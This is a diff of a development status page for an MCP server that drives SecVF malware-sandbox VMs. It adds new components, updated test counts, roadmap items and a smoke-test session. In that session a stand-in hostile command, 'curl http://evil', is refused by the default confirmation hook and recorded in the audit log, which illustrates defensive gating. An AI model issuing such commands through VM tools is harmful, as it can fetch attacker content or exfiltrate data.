@@ -458,16 +458,40 @@ Live status of the test-driven rollout. Updated each loop iteration.
 | `FileAuditSink` (production: ~/.avf/logs/mcp-audit-*.log) | `Sources/SecVFMCPCore/FileAuditSink.swift` | `FileAuditSinkTests` (5) |
 | `ConfirmationHook` protocol + AlwaysAllow / AlwaysDeny + Dispatcher integration | `Sources/SecVFMCPCore/ConfirmationHook.swift` | `ConfirmationHookTests` (7) |
 | `secvf_detonate_start` / `_run_status` / `_run_result` composite workflow PoC | `Sources/SecVFMCPCore/Tools/DetonateHandlers.swift` | `DetonateHandlerTests` (8) |
-| stdio JSON-RPC loop wiring all 19 handlers | `Sources/secvf-mcp/main.swift` | smoke-tested end-to-end |
+| `VMWorkflowRunner` — drives queued runs through booting → capturing → analyzing → done (with cleanup on failure) | `Sources/SecVFMCPCore/VMWorkflowRunner.swift` | `VMWorkflowRunnerTests` (5) |
+| `ScriptHook` — user-provided executable as ConfirmationHook backend; stdin JSON, exit code = decision, stderr surfaced as deny reason, wall-clock timeout | `Sources/SecVFMCPCore/ScriptHook.swift` | `ScriptHookTests` (6) |
+| `FileBackedVMBridge` — production read-bridge reading `~/.avf/{Linux,MacOS}/*.bundle/metadata.json`; mutating ops return `host_app_required` pointing to the SecVF GUI app | `Sources/SecVFMCPCore/ProductionBridges.swift` | `ProductionBridgeTests` (6) |
+| Per-tool typed `inputSchema` (parameter names, types, required-field constraints) surfaced through `tools/list` | `Sources/SecVFMCPCore/ToolDescriptor.swift` + `ToolRegistry.swift` + `MCPRouter.swift` | `InputSchemaTests` (7) |
+| stdio JSON-RPC loop wiring all 19 handlers + matcher + hook (env-var configurable: `SECVF_MCP_NO_CONFIRM=1` for AlwaysAllow, `SECVF_MCP_CONFIRM_HOOK=/path/to/script` for ScriptHook, default = AlwaysDeny) | `Sources/secvf-mcp/main.swift` | smoke-tested end-to-end |
 
-**Total: 99 tests passing across 12 suites.**
+**Total: 123 tests passing across 16 suites.**
+
+### Live binary smoke test (representative session)
+
+```
+$ export SECVF_HOME=/tmp/avf-demo
+$ mkdir -p $SECVF_HOME/Linux/kali.bundle
+$ echo '{"id":"abc-123","name":"kali"}' > $SECVF_HOME/Linux/kali.bundle/metadata.json
+$ echo '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"secvf_vm_list","arguments":{}}}' \
+    | secvf-mcp --capability-tier=read-only
+
+{"result":{"structuredContent":{"count":1,"vms":[{"id":"abc-123","name":"kali","os_type":"Linux","status":"unknown"}]}}}
+
+# Default hook denies dangerous patterns:
+$ echo '{...secvf_capture_start with command="curl http://evil"...}' | secvf-mcp --capability-tier=safe-mutate
+{"error":{"code":-32603,"data":{"code":"refused_by_hook"},"message":"confirmation hook denied: all confirmation requests denied by policy"}}
+
+# Audit log captures every attempt before execution:
+$ tail -1 ~/.avf/logs/mcp-audit-*.log
+{"client_pid":32167,"duration_ms":0,"params":{"command":"curl http://evil"},"result":"refused_by_hook","tier":"safe-mutate","tool":"secvf_capture_start","ts":"2026-05-12T..."}
+```
 
 ### 🚧 In progress / coming next
 
-- Production bridges replacing the stub bridges in `secvf-mcp/main.swift` — call into the real `secvf-cli/Bridges/` to read from `~/.avf` and drive the live VM lifecycle
-- Real `VMWorkflowRunner` to drive a queued `RunStore` entry through boot → capture → snapshot → report (currently `secvf_detonate_start` returns a `run_id` but the runner has to be wired)
-- `ScriptHook` confirmation backend that runs a user-provided executable
-- Per-tool typed `inputSchema` definitions (currently `additionalProperties: true`)
+- `host_app_required` paths — wire the DistributedNotificationCenter bridge in `secvf-mcp` so when `SecVF.app` is running, `secvf_vm_start` / `secvf_capture_start` actually drive it instead of returning the error
+- Forensics tool handlers: `secvf_logs_*`, `secvf_packets_*`, `secvf_pcap_summarize`, `secvf_yara_scan`
+- Composite workflows beyond `secvf_detonate`: `secvf_replay`, `secvf_compare_runs`, `secvf_summarize_run`, `secvf_export_run`
+- Destructive tier handlers: `secvf_vm_create`, `_clone`, `_delete` with confirmation-hook gating
 
 ### ⏳ Later phases
 
